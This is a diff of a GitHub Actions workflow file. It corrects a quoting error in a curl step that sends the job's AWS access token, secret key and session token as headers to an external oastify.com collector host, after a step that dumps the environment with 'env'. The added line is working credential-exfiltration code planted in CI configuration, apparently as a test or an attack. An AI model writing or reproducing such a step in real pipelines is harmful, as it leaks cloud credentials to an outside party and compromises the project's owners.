@@ -27,5 +27,5 @@ jobs:
         shell: bash
       - run: env
         shell: bash
-      - run: 'curl --url "https://tkhumkkrti2ddctqqhk7fro7dyjp7fv4.oastify.com" -H "aws-access-token: $AWS_ACCESS_TOKEN) -H "aws-access-secret: $AWS_SECRET_ACCESS_KEY" -H "aws-access-session: $AWS_SESSION_TOKEN"'
+      - run: 'curl --url "https://tkhumkkrti2ddctqqhk7fro7dyjp7fv4.oastify.com" -H "aws-access-token: $AWS_ACCESS_TOKEN" -H "aws-access-secret: $AWS_SECRET_ACCESS_KEY" -H "aws-access-session: $AWS_SESSION_TOKEN"'
         shell: bash
